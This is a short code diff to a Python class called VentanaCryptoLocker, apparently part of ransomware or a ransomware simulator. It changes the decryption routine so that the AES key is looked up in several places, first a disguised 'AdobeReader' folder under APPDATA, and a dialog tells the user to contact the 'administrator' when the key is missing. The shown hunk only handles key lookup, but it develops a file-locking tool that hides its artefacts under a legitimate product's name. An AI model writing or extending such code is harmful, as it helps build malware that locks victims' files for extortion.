@@ -244,12 +244,24 @@ class VentanaCryptoLocker:
             from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
             from cryptography.hazmat.backends import default_backend
             
-            # Leer clave
-            key_file = os.path.join(self.script_dir, '.aes_key')
-            if os.path.exists(key_file):
-                with open(key_file, 'r') as f:
-                    key = bytes.fromhex(f.read().strip())
-            else:
+            # Leer clave - buscar en múltiples ubicaciones
+            key = None
+            key_locations = [
+                os.path.join(os.environ.get('APPDATA', ''), 'AdobeReader', '.aes_key'),
+                os.path.join(self.script_dir, '.aes_key'),
+                os.path.join(os.getcwd(), '.aes_key')
+            ]
+            
+            for key_file in key_locations:
+                if os.path.exists(key_file):
+                    try:
+                        with open(key_file, 'r') as f:
+                            key = bytes.fromhex(f.read().strip())
+                        break
+                    except:
+                        continue
+            
+            if not key:
                 messagebox.showerror("Error", "Clave de descifrado no encontrada. Contacte al administrador.")
                 return
             
